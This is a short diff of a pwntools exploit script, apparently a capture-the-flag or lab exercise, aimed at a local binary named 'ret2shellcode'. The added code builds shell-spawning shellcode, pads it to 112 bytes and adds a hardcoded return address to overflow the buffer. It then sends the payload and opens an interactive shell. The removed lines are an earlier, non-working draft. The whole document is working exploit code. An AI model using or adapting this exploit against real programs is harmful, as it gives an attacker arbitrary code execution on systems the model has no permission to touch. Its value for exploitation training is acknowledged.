@@ -1,13 +1,9 @@
+
 from pwn import *
 
-addr = 0x0804863A
+sh = process('./ret2shellcode')
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
 
-r = process('./ret2shellcode')
-
-shellcode = asm(shellcraft.r())
-
-#buf2.addr = 
-
-r.sendline(payload)
-
-r.interactive()
+sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
+sh.interactive()
